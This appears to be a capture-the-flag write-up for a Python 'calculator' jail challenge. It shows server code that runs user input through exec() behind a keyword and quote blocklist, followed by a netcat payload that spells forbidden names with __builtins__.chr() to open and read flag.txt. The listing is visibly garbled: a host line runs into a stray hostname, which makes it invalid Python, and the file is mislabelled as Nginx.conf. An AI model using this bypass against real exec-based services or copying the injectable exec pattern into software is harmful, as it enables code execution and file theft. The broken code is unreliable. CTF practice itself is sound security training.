EN: You have found an exposed calculator program. It doesn’t seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. Can you make this application more useful? Python version is 3.12.3

Service: exp.cybergame.sk:7002
## Nginx.conf attached file
```    import socket
import os
import pty
import sys

def handle_client(conn):
    s_fd = conn.fileno()
    os.dup2(s_fd, 0)
    os.dup2(s_fd, 1)
    os.dup2(s_fd, 2)
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    text = data.decode().strip()

    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    # Check for forbidden characters.
    for character in ['\'', '\"']:
        if character in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    try:
        exec('print(' + text + ')')
    except Exception as e:
        conn.sendall(("Error: " + str(e) + "\n").encode())

def main():
    host = '0.0.0.0'exp.cybergame.sk:7002
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}")
        conn, addr = s.accept()  # Handle one connection.
        with conn:
            print(f"Connection from {addr}")
            handle_client(conn)
    sys.exit(0)

if __name__ == "__main__":
    main()

```
# Solution
Convert every forbidden word into using `__builtins__.chr(INT)` method
```# Using netcat
nc exp.cybergame.sk 7002

# Once connected, paste the following line and press Enter:
__builtins__.getattr( __builtins__.getattr(__builtins__, __builtins__.chr(111)+__builtins__.chr(112)+__builtins__.chr(101)+__builtins__.chr(110))(__builtins__.chr(102)+__builtins__.chr(108)+__builtins__.chr(97)+__builtins__.chr(103)+__builtins__.chr(46)+__builtins__.chr(116)+__builtins__.chr(120)+__builtins__.chr(116)) , __builtins__.chr(114)+__builtins__.chr(101)+__builtins__.chr(97)+__builtins__.chr(100)+__builtins__.chr(108)+__builtins__.chr(105)+__builtins__.chr(110)+__builtins__.chr(101)+__builtins__.chr(115) )()

```

